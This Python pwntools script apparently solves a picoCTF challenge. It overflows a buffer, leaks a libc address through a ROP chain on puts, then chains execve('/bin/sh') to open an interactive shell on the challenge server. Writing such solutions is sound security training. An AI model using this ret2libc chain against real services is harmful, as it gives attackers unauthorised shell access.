#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = 'debug'


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 62289)

    return r


def main():
    r = conn()

    offset = 136

    rop = ROP(exe)
    rop.raw(b'A' * offset)
    rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
    rop.raw(exe.got.puts)
    rop.raw(exe.plt.puts)
    rop.raw(exe.sym.main)

    r.recvuntil(b'sErVeR!\n')
    r.sendline(rop.chain())

    r.recvline()

    libc.address = u64(r.recv(6).strip(b'\n').ljust(8, b'\x00')) - libc.sym.puts
    log.info("libc, %#x", libc.address)

    rop2 = ROP(libc)
    rop2.raw(b'A' * offset)
    rop2.raw(rop2.find_gadget(['pop rdi', 'ret'])[0])
    rop2.raw(next(libc.search(b'/bin/sh\x00')))
    rop2.raw(rop2.find_gadget(['pop rsi', 'ret'])[0])
    rop2.raw(0)
    rop2.raw(rop2.find_gadget(['pop rdx', 'ret'])[0])
    rop2.raw(0)
    rop2.raw(libc.sym.execve)

    r.sendline(rop2.chain())

    r.interactive()

if __name__ == "__main__":
    main()
